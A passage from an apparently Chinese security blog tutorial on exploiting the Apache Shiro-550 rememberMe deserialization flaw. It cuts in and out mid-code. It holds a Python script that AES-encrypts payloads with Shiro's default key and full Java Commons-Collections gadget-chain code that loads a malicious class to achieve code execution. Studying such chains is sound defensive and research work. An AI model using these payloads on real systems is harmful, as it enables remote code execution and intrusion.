string">"kPH+bIxk5D2deZiIxcaaaA=="</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    iv <span class="token operator">=</span> enc_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> unpad<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>    <span class="token keyword">return</span> plaintext<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> get_file_data<span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>aes_enc<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>生成的payload直接打 ：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"><br>记得把前面的<code>JSESSIONID=4917903F4BDDD8CCC8E5BC04BC8006B3;</code>删掉，因为这个也相当于登陆验证，有这个存在就不会关注Cookie的内容了。<br>我们发送数据包后，成功发现发起了DNS请求:<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"><br>同理如果shiro项目有CC依赖或者其他可攻击的库就可以造成反序列攻击了</p><h2 id="CC3-2-1攻击"><a href="#CC3-2-1攻击" class="headerlink" title="CC3.2.1攻击"></a>CC3.2.1攻击</h2><p>因为默认情况下shiro是没有CC3.2.1的，我们手动导入一下：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>导入包之后我们尝试使用CC6攻击一下：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png"><br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"><br>发现并没有弹出计算器，我们到IDEA中去看一眼：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"><br>发现报错了，原因是加载不到Transformer类</p><h3 id="为什么加载不到Transformer类？"><a href="#为什么加载不到Transformer类？" class="headerlink" title="为什么加载不到Transformer类？"></a>为什么加载不到Transformer类？</h3><p>我们从入口deserialize入手：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"><br>反序列的时候出了问题，肯定就是readObject那里出了问题<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png"><br>跟进到<code>ClassResolvingObjectInputStream</code>这个类里面<br>构造函数是调用父类构造函数就不看了<br>看一下里面重写了一个方法：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass osc<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> ClassUtils<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>osc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownClassException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"Unable to load ObjectStreamClass ["</span> <span class="token operator">+</span> osc <span class="token operator">+</span> <span class="token string">"]: "</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-txt"><code class="language-txt">**resolveClass这个方法是Java原生反序列的时候必定会调用的，这里重写了就不会调用Java内置的resolveClass了**</code></pre><p>ClassUtils是shiro自己的工具类<br>我们跟进看一下他的forName方法：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Class <span class="token class-name">forName</span><span class="token punctuation">(</span>String fqcn<span class="token punctuation">)</span> <span class="token keyword">throws</span> UnknownClassException <span class="token punctuation">{</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> THREAD_CL_ACCESSOR<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>fqcn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Unable to load class named ["</span> <span class="token operator">+</span> fqcn <span class="token operator">+</span>                        <span class="token string">"] from the thread context ClassLoader.  Trying the current ClassLoader..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            clazz <span class="token operator">=</span> CLASS_CL_ACCESSOR<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>fqcn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Unable to load class named ["</span> <span class="token operator">+</span> fqcn <span class="token operator">+</span> <span class="token string">"] from the current ClassLoader.  "</span> <span class="token operator">+</span>                        <span class="token string">"Trying the system/application ClassLoader..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            clazz <span class="token operator">=</span> SYSTEM_CL_ACCESSOR<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>fqcn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String msg <span class="token operator">=</span> <span class="token string">"Unable to load class named ["</span> <span class="token operator">+</span> fqcn <span class="token operator">+</span> <span class="token string">"] from the thread context, current, or "</span> <span class="token operator">+</span>                    <span class="token string">"system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found."</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnknownClassException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>可以发现<strong>resolveClass.forName</strong>的类加载全都是用loadClass进行的，但是loadClass无法加载代有数组<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png"></p><h3 id="拼凑CC链攻击"><a href="#拼凑CC链攻击" class="headerlink" title="拼凑CC链攻击"></a>拼凑CC链攻击</h3><p>拼凑的CC链需要满足没有数组的情况，就是终点不能引用<code>Runtime.getRuntime</code>，需要用到defineClass加载恶意类。<br>改写用到CC<br>这一步需要重新复习CC了，鸽一下</p><h3 id="打commons-collections3"><a href="#打commons-collections3" class="headerlink" title="打commons-collections3"></a>打commons-collections3</h3><p>继续上周的部分，打cc3这个版本需要不能带有数组。于是我们需要拼凑CC链子，因此就需要对CC链子很了解，但是很不幸的是似乎无法自己构造出这一条CC链子，于是复习一下CC链子重新学习。要理解其中含义才行。<br>我们先来看结果：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>omg<span class="token punctuation">.</span>SendingContext<span class="token punctuation">.</span>RunTime<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//cc3</span>        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>TemplatesImpl<span class="token operator">></span> templatesClass <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field nameField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field bytecodesField <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D://netcat//Test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodesField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//cc2</span>        InvokerTransformer invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//cc6</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> decorate <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorate<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"key2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        decorate<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">aClass</span> <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>decorate<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        unserialize("ser.bin");</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">unserialize</span><span class="token punctuation">(</span>String Filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>Filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>先序列化生成文件，之后复制到<code>shiro550.py</code>目录下，生成AES加密的rememberMe<br>直接打：<br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"><br>弹出计算机就算成功了</p><h2 id="构造无数组CC链"><a href="#构造无数组CC链" class="headerlink" title="构造无数组CC链"></a>构造无数组CC链</h2><p><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png"><br>这是全部CC链子的构造流程，其中有两个地方是需要数组的：</p><h3 id="1-InstantiateTransformer-类"><a href="#1-InstantiateTransformer-类" class="headerlink" title="1.InstantiateTransformer 类"></a>1.InstantiateTransformer 类</h3><p>因为<code>InstantiateTransformer</code>的下一个是利用<code>TrAXFilter</code> TrAXFilter这个类没有继承serialize接口  ，所以只能用<code>Transformer</code>数组包装构造他</p><h3 id="2-Runtime类"><a href="#2-Runtime类" class="headerlink" title="2.Runtime类"></a>2.Runtime类</h3><p>Runtime也没有继承Serialize接口，要用反射的方法包装他，因此也用到了<code>Transformer</code>数组</p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>因为这里需要构造没有数组的链子，我们采用加载恶意类的方式，左半部分（序列化入口）的我们就用CC6的链子<br>这里说一个比较细节的点就是从<code>LazyMap.get</code>到<code>InvokerTransformer.transformer</code>再到<code>TemplatesImpl.Transformer</code> 只要迈过这个坎其他就很好理解了。<br>首先我们从<code>LazyMap.get</code>入手：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// create value for key if key is not currently in the map</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object value <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> value<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>这里的<code>factory.transform(key)</code>是我们后续利用的关键，并且最重要的是这里的factory和参数key都是我们可控的</p><h4 id="1-key"><a href="#1-key" class="headerlink" title="1.key"></a>1.key</h4><p><code>key</code>就是<code>factory.transform</code>的参数，在这里就是<code>InvokerTransformer.transform</code>的<code>input</code>参数。即<code>Lazy.get -&gt; key</code> &#x3D;&#x3D;<code>InvokerTransformer.transform -&gt; input</code><br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"><br>因为这里是要对<code>TemplatesImpl</code>类调用<code>newTransformer</code>方法<br>所以key我们就传入TemplatesImpl</p><h4 id="2-factory"><a href="#2-factory" class="headerlink" title="2.factory"></a>2.factory</h4><p>factory是我们构造LazyMap的时候传入的：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">LazyMap</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Factory must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>factory <span class="token operator">=</span> factory<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>LazyMap的构造函数是私有的，我们利用decorate构造,但是由于序列化的时候不触发反序列化，我们后面利用反射修改factory的值</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Map <span class="token function">decorate</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>根据链子我们是先走到<code>InvokerTransformer</code>类里面去的，因此后面反射的时候要把<code>factory</code>设置成<code>InvokerTransformer</code>。那我们构造<code>InvokerTransformer</code>的时候带什么参数构造呢？<br><code>LazyMap.get</code>是走到<code>InvokerTransformer.transform</code><br><img src="/Blogimages/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png"><br>因为这里是要对<code>TemplatesImpl</code>类调用<code>newTransformer</code>方法<br>所以factory我们就传入newTransformer</p><p>同理我们可以利用这个方法构造其他路径的CC链：</p><h3 id="CC5-CC2-CC3"><a href="#CC5-CC2-CC3" class="headerlink" title="CC5+CC2+CC3"></a>CC5+CC2+CC3</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>omg<span class="token punctuation">.</span>SendingContext<span class="token punctuation">.</span>RunTime<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token 